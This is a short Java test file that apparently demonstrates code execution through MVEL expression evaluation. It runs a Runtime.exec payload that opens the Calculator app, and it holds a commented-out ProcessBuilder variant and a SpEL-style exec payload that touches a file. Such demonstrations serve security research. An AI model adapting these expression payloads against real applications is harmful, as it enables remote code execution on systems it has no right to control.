package com.test;

import org.mvel2.MVEL;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

public class Test {
    //T(java.lang.Runtime).getRuntime().exec('touch /tmp/test/1');
    public static void main(String[] args) {
        Map vars = new HashMap();
        String expression1 = "Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\")";
        Serializable serializable = MVEL.compileExpression(expression1);
        vars.put("1",expression1);
        MVEL.executeExpression(serializable,vars);

//        String expression2 = "new java.lang.ProcessBuilder(new java.lang.String[]{\"open /System/Applications/Calculator.app\"}).start()";
//        vars.put("2",expression2);
//        MVEL.eval(expression2,vars);
    }
}
